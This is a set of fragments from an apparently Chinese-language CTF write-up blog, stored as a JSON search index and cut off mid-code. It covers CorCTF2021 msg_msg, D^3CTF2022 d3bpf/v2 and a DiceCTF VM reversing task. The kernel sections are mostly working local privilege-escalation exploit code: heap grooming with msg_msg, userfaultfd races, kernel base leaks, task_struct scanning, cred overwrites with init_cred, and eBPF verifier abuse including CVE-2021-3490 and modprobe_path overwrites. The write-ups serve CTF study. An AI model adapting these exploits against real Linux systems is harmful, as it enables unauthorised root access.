msgget\"); } qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); if (qid[1] \u003c 0) { die(\"[!] Failed to msgget\"); } printf(\"[+] qid[0] = %d, qid[1] = %d\\n\", qid[0], qid[1]); 在QID#0上发送一个0x10的消息（实际0x10+0x30），QID#1上发送一个0x10的消息，再发送一个0xfd0+0xff8大小的消息。 bzero(msg_buf, 0x2000); message-\u003emtype = 1; memset(message-\u003emtext, 0x41, 0x10); send_msg(qid[0], message, 0x40 - 0x30, 0); memset(message-\u003emtext, 0x42, 0x10); send_msg(qid[1], message, 0x40 - 0x30, 0); send_msg(qid[1], message, 0x1ff8 - 0x30, 0); 此时，QID#0上的消息就是UAF控制的kmalloc-64块。 此时的堆布局如下 一个msg_msg消息的最大为0x2000，我们修改QID#0消息的大小，读取数据。因为QID#0和QID#1的0x10消息属于同一个大小，两者的距离可能很近。我们就能读取QID#2的0x10消息的list_head，还能得到全局变量 dynamic_kobj_ktype 泄露内核基址。题目作者泄露的是sysfs_bin_kfops_ro。 如下图： ((struct msg_msg *)rule)-\u003em_list.next = (void *)0xAAAAAAAA; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)0xBBBBBBBB; ((struct msg_msg *)rule)-\u003em_ts = 0x2000; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 0; rule-\u003etype = OUTBOUND; strcpy(rule-\u003eip, \"000000000\"); ioctl(global_fd, EDIT_RULE, rule); void *dump = calloc(1, 0x2000); printf(\"[+] dump:\\t%p\\n\", dump); ret = msgrcv(qid[0], dump, 0x2000, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } int i = 0; uint64_t val = 0; for (i = 0; i \u003c 0x2000 / 8; i++) { val = ((uint64_t *)dump)[i]; if ((val \u0026 0xffffffff) == 0x42424242) { next = ((uint64_t *)dump)[i - 6]; prev = ((uint64_t *)dump)[i - 5]; // skip i++; } if ((val \u0026 0xffff) == 0x1600) { dynamic_kobj_ktype = val; } if ((dynamic_kobj_ktype != 0) \u0026\u0026 (next != 0) \u0026\u0026 (prev != 0)) break; } if (((int64_t)next \u003e= 0) || ((int64_t)prev \u003e= 0)) { printf(\"[!] Failed to get next and prev, try again\\n\"); goto done; } kernbase = dynamic_kobj_ktype - 0xc41600; init_task = kernbase + 0xc124c0; init_cred = kernbase + 0xc33060; 这里得到next和prev的值有一定的概率。 ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#泄露内核基址--msg-链表"},{"categories":["Writeups"],"content":"任意地址读 \u0026 task_struct 遍历修改UAF的块的next为目标地址-8即可实现任意地址读，同第一题对tasks进行遍历找到当前进程的task_struct。 printf(\"[*] Task struct searching...\\n\"); pid_t pid = getpid(); printf(\"[+] self pid:\\t%d\\n\", pid); uint64_t cur = init_task; ((struct msg_msg *)rule)-\u003em_ts = 0xfd0 + 0x200; for (;;) { pid_t cur_id = 0; bzero(rule-\u003eip, 16); ip_value_to_str(cur + 0x290, rule-\u003eip, 16); ip_value_to_str((cur + 0x290) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); bzero(dump, 0x1500); ret = msgrcv(qid[0], dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } // read pid cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8)); printf(\"[+] cur:\\t0x%lx, pid:\\t%d\\n\", cur, cur_id); if (cur_id == pid) { task_struct = cur; break; } // next cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298; } printf(\"[+] task_struct:\\t0x%lx\\n\", task_struct); ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:2","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#任意地址读--task_struct-遍历-1"},{"categories":["Writeups"],"content":"堆风水构造任意地址写下面到了最关键的部分，我们将通过堆风水与userfaultfd实现任意地址写，从而提权！ 首先，接收QID#1的所有消息，不带MSG_COPY标志。这样QID#1中的kmalloc-64和两个kmalloc-4096都被free了，且先被free的是msg_msg部分。 接着，我们再申请一个消息队列QID#2，发送一个0x1ff8 - 0x30大小的消息，msg_msg使用的正是原来的segment结构，而其next指向了原本的msg_msg结构，这部分的地址是我们已知的，即list_head→next。同时，我们在其拷贝msg_msg消息数据时，使用userfaultfd卡住。布局如下图： 在userfault handler中，修改QID#0的消息的next指向QID#2消息的segment，修正其list和m_ts，然后接收所有消息，不带MSG_COPY标志。这样，QID#2的segment就会被free了。 printf(\"[+] page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Modified msg0 next to msg2's segment\\n\"); user_rule_t *rule = calloc(1, sizeof(user_rule_t)); ((struct msg_msg *)rule)-\u003em_list.next = (void *)prev; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)prev; ((struct msg_msg *)rule)-\u003em_ts = 0x10; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 0; rule-\u003etype = OUTBOUND; ip_value_to_str(next, rule-\u003eip, 16); ip_value_to_str((next) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); char buf[0x10]; msgrcv(qid[0], buf, 0x10, 0, IPC_NOWAIT | MSG_NOERROR); printf(\"[*] Prepare fake msg struct\\n\"); bzero(msg_buf, sizeof(msg_buf)); ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))-\u003enext = (void *)(task_struct + 0x530); ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))-\u003em_ts = 0xff8; ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))-\u003em_type = 1; printf(\"[*] Now userfault 2\\n\"); ((msg *)(target2 + PAGE_SIZE - 0x10))-\u003emtype = 1; send_msg(qid[3], target2 + PAGE_SIZE - 0x10, 0xff8, 0); 堆布局如下： 接着，不释放userfault handler1。而是申请一个新的消息队列QID#3。并创建一个0xfd8+0x30的消息。此时，QID#2的segment被分配给了新的msg_msg结构。同样，我们在QID#3拷贝消息数据时，使用userfaultfd卡住。堆布局如下： 在userfaulr handler2中，释放userfault handler1。使得QID#3的msg_msg结构的next被修改为目标地址。即当前进程的task_struct→cred -8 堆布局如下： 继续处理userfault 2，使用init_cred覆写cred和read_cred即可提权。 printf(\"[+] user 2 page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Release uffd 1\\n\"); struct uffdio_copy uc; bzero(\u0026uc, sizeof(struct uffdio_copy)); // use uffdio_copy to write request's message uc.src = (unsigned long)msg_buf; uc.len = PAGE_SIZE; uc.dst = (unsigned long)0x1338000 \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(u1, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] Failed to uffdio_copy\"); } char *payload = calloc(1, 0x2000); *((uint64_t *)(payload + 0xfd0 - 8)) = init_cred; *((uint64_t *)(payload + 0xfd0)) = init_cred; *((uint64_t *)(payload + 0xfd0 + 8)) = init_cred; uffd_copy(uffd, payload, \u0026uf_msg); ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:3","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#堆风水构造任意地址写"},{"categories":["Writeups"],"content":"EXP #include \"./exploit.h\"#include \u003cstdint.h\u003e #define ADD_RULE 0x1337babe #define DELETE_RULE 0xdeadbabe #define EDIT_RULE 0x1337beef #define SHOW_RULE 0xdeadbeef #define DUP_RULE 0xbaad5aad #define INBOUND 0 #define OUTBOUND 1 #define SKIP -1 #define DESC_MAX 0x800 typedef struct { char iface[16]; char name[16]; char ip[16]; char netmask[16]; uint8_t idx; uint8_t type; uint16_t proto; uint16_t port; uint8_t action; } user_rule_t; typedef struct { char iface[16]; char name[16]; uint32_t ip; uint32_t netmask; uint16_t proto; uint16_t port; uint8_t action; uint8_t is_duplicated; } rule_t; struct list_head { struct list_head *next, *prev; }; struct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ void *next; /* struct msg_msgseg *next; */ void *security; //无SELinux，这里为NULL /* the actual message follows immediately */ }; typedef struct { long mtype; char mtext[1]; } msg; int global_fd; uint64_t kernbase, init_ipc_ns, init_task, init_cred; uint64_t task_struct, dynamic_kobj_ktype, sysfs_bin_kfops_ro; uint64_t next, prev; void *target1, *target2; int qid[4]; char msg_buf[0x2000]; uint64_t u1; uint64_t relased = 0; void ip_value_to_str(int ip, char *result, int size) { inet_ntop(AF_INET, (void *)\u0026ip, result, size); } void add_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, ADD_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to add rule\"); } } void dup_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DUP_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to dup rule\"); } } void del_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DELETE_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to del rule\"); } } void send_msg(int id, void *buf, size_t size, int flags) { if (msgsnd(id, buf, size, flags) \u003c 0) { die(\"[!] Failed to send msg\"); } printf(\"[+] Send message: 0x%lx\\n\", size); } static void fault_handler_2(void *arg) { puts(\"[+] Enter userpagefault 2\"); static struct uffd_msg uf_msg; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] user2 polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026uf_msg, sizeof(uf_msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (uf_msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] user 2 page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Release uffd 1\\n\"); struct uffdio_copy uc; bzero(\u0026uc, sizeof(struct uffdio_copy)); // use uffdio_copy to write request's message uc.src = (unsigned long)msg_buf; uc.len = PAGE_SIZE; uc.dst = (unsigned long)0x1338000 \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(u1, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] Failed to uffdio_copy\"); } char *payload = calloc(1, 0x2000); *((uint64_t *)(payload + 0xfd0 - 8)) = init_cred; *((uint64_t *)(payload + 0xfd0)) = init_cred; *((uint64_t *)(payload + 0xfd0 + 8)) = init_cred; uffd_copy(uffd, payload, \u0026uf_msg); break; } puts(\"[+] exit userpagefault 2 fault_handler!\"); } static void fault_handler_1(void *arg) { puts(\"[+] Enter userpagefault 1\"); static struct uffd_msg uf_msg; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; u1 = uffd; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026uf_msg, sizeof(uf_msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (uf_msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Modified msg0 next to msg2's segment\\n\"); user_rule_t *rule = calloc(1, sizeof(user_rule_t)); ((struct msg_msg *)rule)-\u003em_list.next = (void *)prev; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)prev; ((struct msg_msg *)rule)-\u003em_ts = 0x10; ((struct msg_msg","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:4","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#exp-1"},{"categories":["Writeups"],"content":"d3bpf","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:0:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#d3bpf"},{"categories":["Writeups"],"content":"patch case BPF_RSH: if (umin_val \u003e= insn_bitness) { if (alu32) __mark_reg32_known(dst_reg, 0); else __mark_reg_known_zero(dst_reg); break; } if (alu32) scalar32_min_max_rsh(dst_reg, \u0026src_reg); else scalar_min_max_rsh(dst_reg, \u0026src_reg); break; 似乎在不同的架构上右移64的结果不一样，但是在本题中，右移64位会保持原值。 gef➤ p/x 1\u003e\u003e64 $1 = 0x1 但是，verifier认为该值为0，以此造成边界检查错误。 ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:1:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#patch"},{"categories":["Writeups"],"content":"vulncve-2021-3490和patch的指令都可以利用，我这里使用cve-2021-3490。 构造verifier为0，runtime为1的寄存器。在构造成功后，利用步骤就和eebpf基本没有区别了。越界读取map的ops，leak内核地址。修改map-\u003ebtf为目标地址，通过bpf_map_get_info_by_id进行任意地址读，搜索进程的task_struct。 在map内伪造虚表 劫持map-\u003emap_ops到提前构造的虚表 修改map-\u003etype为BPF_MAP_TYPE_STACK 修改map-\u003emax_entries为0xffffffff 修改map-\u003espin_lock_off为0，以绕过其他的检查 bpf_map_push_elem指针修改为array_map_get_next_key 调用BPF_MAP_UPDATE_ELEM即可任意地址写，修改当前进程的cred实现提取。 ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:2:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#vuln"},{"categories":["Writeups"],"content":"exp #define _GNU_SOURCE #include \"bpf_insn.h\"#include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/bpf_common.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e #define PAGE_SIZE 4096 #define HELLO_MSG \"I am Niebelungen, let me in!\" #define MSG_LEN 28 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; int control_map, read_map, write_map; int reader_fd, reader_sock; int writer_fd, writer_sock; uint64_t kernbase; uint64_t init_task; int _bpf(int cmd, union bpf_attr *attr, uint32_t size) { return syscall(__NR_bpf, cmd, attr, size); } int create_map(int value_size, int cnt) { int map_fd; union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY, .key_size = 4, .value_size = value_size, .max_entries = cnt}; map_fd = _bpf(BPF_MAP_CREATE, \u0026attr, sizeof(attr)); if (map_fd \u003c 0) { die(\"[!] Error creating map\"); } printf(\"[+] created map: %d\\n\\tvalue size: %d\\n\\tcnt: %d\\n\", map_fd, value_size, cnt); return map_fd; } int prog_load(struct bpf_insn *prog, int insn_cnt) { int prog_fd; char log_buf[0xf000]; union bpf_attr attr = { .prog_type = BPF_PROG_TYPE_SOCKET_FILTER, .insn_cnt = insn_cnt, .insns = (uint64_t)prog, .license = (uint64_t) \"GPL\", .log_level = 2, .log_size = sizeof(log_buf), .log_buf = (uint64_t)log_buf, }; prog_fd = _bpf(BPF_PROG_LOAD, \u0026attr, sizeof(attr)); // printf(\"[+] log_buf: %s\\nLOG_END\\n\", log_buf); if (prog_fd \u003c 0) { die(\"[!] Failed to load BPF prog!\"); } return prog_fd; } int update_item(int fd, int idx, uint64_t value) { union bpf_attr attr = { .map_fd = fd, .key = (uint64_t)\u0026idx, .value = (uint64_t)\u0026value, .flags = BPF_ANY, }; // printf(\"[+] update_item;\\n\\tmap_fd: %d\\n\\tidx: 0x%x\\n\\tvalue: 0x%lx\\n\", fd, // idx, value); return _bpf(BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } uint64_t get_item(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return *(uint64_t *)value; } uint32_t READ32(uint64_t target) { update_item(control_map, 0, 0); update_item(control_map, 1, target - 0x58); if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) \u003c 0) { die(\"[!] Failed to send HELLO_MSG\"); } struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info)); union bpf_attr push_attr = { .info.bpf_fd = read_map, .info.info_len = sizeof(*info), .info.info = (uint64_t)info, }; if (_bpf(BPF_OBJ_GET_INFO_BY_FD, \u0026push_attr, sizeof(push_attr)) \u003c 0) { die(\"[!] Failed to get push\"); } return info-\u003ebtf_id; } uint64_t READ64(uint64_t target) { uint64_t low = READ32(target); uint64_t high = READ32(target + 4); return low + (high \u003c\u003c 32); } uint64_t leak_kernel() { int leak_fd; struct bpf_insn prog[] = { BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0), BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit // (1) r6: var_off = {mask = 0xFFFFFFFF00000000; value = 0x1} BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_0, 0), // r5 = *(u64 *)(r0 +0) BPF_MOV64_REG(BPF_REG_6, BPF_REG_5), // r6 = r5 BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF), // r2 = 0xFFFFFFFF BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32)","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:3:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#exp"},{"categories":["Writeups"],"content":"d3bpfv2v2同样patch了指令，但是运行在最新版本的内核中5.16.12。在最新的ebpf中加入了新的检测机制： 任何指针只能进行加减操作，不能进行比较（防止侧信道） 在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。 这两条检查让verifier的边界计算错误几乎无法利用。 ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:0:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#d3bpfv2"},{"categories":["Writeups"],"content":"vuln我在这篇文章中找到了新的线索：https://www.openwall.com/lists/oss-security/2022/01/18/2，虽然该cve没有正式放出exp，但是作者说使用bpf_skb_load_bytes可以进行绕过。无论如何，这让我将目光放在了map的帮助函数上。 bpf_skb_load_bytes: BPF_CALL_4(bpf_skb_load_bytes, const struct sk_buff *, skb, u32, offset, void *, to, u32, len) { void *ptr; if (unlikely(offset \u003e 0xffff)) goto err_clear; ptr = skb_header_pointer(skb, offset, len, to); if (unlikely(!ptr)) goto err_clear; if (ptr != to) memcpy(to, ptr, len); return 0; err_clear: memset(to, 0, len); return -EFAULT; } 该函数读取socket的缓冲区到指定的位置，在ebpf程序中可以是栈，map等。 虽然verfier会检查我们读入的大小是否会影响栈中的指针，但是通过patch的指令可以很容易的绕过，从而越界写。 那么思路就是： 在栈中写入array的地址 调用该函数读取数据到array中 覆写array的地址 从栈中取出指针，并读取内容从而leak。 在得到内核地址后，可以使用相同的手法，完全修改栈上的指针，使其指向modprobe_path从而修改它，为任意的值。 开启了kalsr保护，我们修改栈中array指针时，并不能准确得到地址。但只要爆破4bit即可，概率很高。 ","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:1:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#vuln-1"},{"categories":["Writeups"],"content":"exp #define _GNU_SOURCE #include \u003clinux/bpf_common.h\u003e#include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e#include \"bpf_insn.h\" #define PAGE_SIZE 4096 #define BPF_MAP_TYPE_RINGBUF 27 #define BPF_skb_load_bytes 26 #define BPF_skb_load_bytes_relative 68 #define HELLO_MSG \"\\x00\\x00am Niebelungen, let me in!\" #define MSG_LEN 28 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; int control_map, read_map, write_map; int reader_fd, reader_sock; int writer_fd, writer_sock; uint64_t kernbase, modprobe_path; uint64_t init_task; uint32_t guessed = 0; int _bpf(int cmd, union bpf_attr *attr, uint32_t size) { return syscall(__NR_bpf, cmd, attr, size); } int create_map(int value_size, int cnt) { int map_fd; union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY, .key_size = 4, .value_size = value_size, .max_entries = cnt}; map_fd = _bpf(BPF_MAP_CREATE, \u0026attr, sizeof(attr)); if (map_fd \u003c 0) { die(\"[!] Error creating map\"); } printf(\"[+] created map: %d\\n\\tvalue size: %d\\n\\tcnt: %d\\n\", map_fd, value_size, cnt); return map_fd; } int prog_load(struct bpf_insn *prog, int insn_cnt) { int prog_fd; char log_buf[0xf000]; union bpf_attr attr = { .prog_type = BPF_PROG_TYPE_SOCKET_FILTER, .insn_cnt = insn_cnt, .insns = (uint64_t)prog, .license = (uint64_t) \"GPL\", .log_level = 2, .log_size = sizeof(log_buf), .log_buf = (uint64_t)log_buf, }; prog_fd = _bpf(BPF_PROG_LOAD, \u0026attr, sizeof(attr)); // printf(\"[+] log_buf: %s\\nLOG_END\\n\", log_buf); if (prog_fd \u003c 0) { die(\"[!] Failed to load BPF prog!\"); } return prog_fd; } int update_item(int fd, int idx, uint64_t value) { union bpf_attr attr = { .map_fd = fd, .key = (uint64_t)\u0026idx, .value = (uint64_t)\u0026value, .flags = BPF_ANY, }; // printf(\"[+] update_item;\\n\\tmap_fd: %d\\n\\tidx: 0x%x\\n\\tvalue: 0x%lx\\n\", fd, // idx, value); return _bpf(BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } uint64_t get_item(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return *(uint64_t *)value; } uint64_t* get_bigitem(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return value; } uint32_t READ32(uint64_t target) { update_item(control_map, 0, 0); update_item(control_map, 1, target - 0x58); if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) \u003c 0) { die(\"[!] Failed to send HELLO_MSG\"); } struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info)); union bpf_attr push_attr = { .info.bpf_fd = read_map, .info.info_len = sizeof(*info), .info.info = (uint64_t)info, }; if (_bpf(BPF_OBJ_GET_INFO_BY_FD, \u0026push_attr, sizeof(push_attr)) \u003c 0) { die(\"[!] Failed to get push\"); } return info-\u003ebtf_id; } uint64_t READ64(uint64_t target) { uint64_t low = READ32(target); uint64_t high = READ32(target + 4); return low + (high \u003c\u003c 32); } uint64_t leak_kernel() { int leak_fd; struct bpf_insn prog[] = { BPF_MOV64_REG(BPF_REG_8, BPF_REG_1), // save ctx to r8 BPF_MOV64_REG(BPF_REG_9, BPF_REG_10), // r9 = rsp BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, -0x50), // r9 = fp - 0x50 BPF_LD_MAP_FD(BPF_REG_1, read_map), // r1 = map_fd BPF_ST_MEM(BPF_DW, BPF_RE","date":"2022-03-07","objectID":"/d-3ctf2022-d3bpf/:2:0","series":null,"tags":["Writeups"],"title":"D^3CTF2022-d3bpf\u0026v2","uri":"/d-3ctf2022-d3bpf/#exp-1"},{"categories":["Writeups"],"content":"DiceCTF2022-containment/breach一个不一样的虚拟机。一个简单的虚拟机的二进制文件通过利用它来 “突破 “虚拟机，安装新的指令处理程序来进行flag检查。 a binary for a simple VM “breaks out” of the VM by exploiting it and installs new instruction handlers to do flag checking. ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:0:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#dicectf2022-containmentbreach"},{"categories":["Writeups"],"content":"程序分析 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 next_pc; // rax unsigned __int8 opclass; // [rsp-59h] [rbp-61h] unsigned __int8 reg_idx; // [rsp-4Dh] [rbp-55h] __int64 tmp_val; // [rsp-48h] [rbp-50h] FILE *fd; // [rsp-40h] [rbp-48h] __int64 size; // [rsp-38h] [rbp-40h] unsigned __int64 dst_reg; // [rsp-20h] [rbp-28h] unsigned __int64 src_reg; // [rsp-18h] [rbp-20h] setbuf(stdout, 0LL); setbuf(stdin, 0LL); if ( argc != 2 ) { printf(\"Usage: %s program.bin\\n\", *argv); exit(0); } fd = fopen(argv[1], \"rb\"); fseek(fd, 0LL, 2); size = ftell(fd); fseek(fd, 0LL, 0); code = (char *)malloc(size); fread(code, 1uLL, size, fd); while ( !exited ) { opclass = code[pc] \u0026 0xF; if ( opclass \u003e 0xAu ) { printf(\"Unknown instruction: %d\\n\", opclass); exit(-1); } switch ( opclass ) { case 0u: exited = 1; ++pc; break; case 1u: // mov reg, imm Reg_list[(unsigned __int8)code[pc] \u003e\u003e 4] = *(_QWORD *)\u0026code[pc + 1]; pc += 9LL; break; case 2u: // mov reg, reg Reg_list[code[pc + 1] \u0026 0xF] = Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4]; pc += 2LL; break; case 3u: // alu dst, src reg_idx = code[pc + 1] \u0026 0xF; dst_reg = Reg_list[reg_idx]; src_reg = Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4]; if ( (unsigned __int8)((unsigned __int8)code[pc] \u003e\u003e 4) \u003c= 7u ) { switch ( (unsigned __int8)code[pc] \u003e\u003e 4 ) { case 0: tmp_val = dst_reg + src_reg; break; case 1: tmp_val = dst_reg - src_reg; break; case 2: tmp_val = src_reg * dst_reg; break; case 3: tmp_val = dst_reg % src_reg; break; case 4: tmp_val = src_reg \u0026 dst_reg; break; case 5: tmp_val = src_reg | dst_reg; break; case 6: tmp_val = src_reg ^ dst_reg; break; case 7: tmp_val = dst_reg \u003e\u003e src_reg; break; } } Reg_list[reg_idx] = tmp_val; pc += 2LL; break; case 4u: // mov ds:[reg], reg *(__int64 *)((char *)data_seg + Reg_list[code[pc + 1] \u0026 0xF]) = Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4]; pc += 2LL; break; case 5u: // mov reg, ds:[reg] Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4] = *(__int64 *)((char *)data_seg + Reg_list[code[pc + 1] \u0026 0xF]); pc += 2LL; break; case 6u: // mov reg, cs:[reg] Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4] = *(_QWORD *)\u0026code[Reg_list[code[pc + 1] \u0026 0xF]]; pc += 2LL; break; case 7u: // jmp imm pc = *(_QWORD *)\u0026code[pc + 1]; break; case 8u: // jmp reg pc = Reg_list[(unsigned 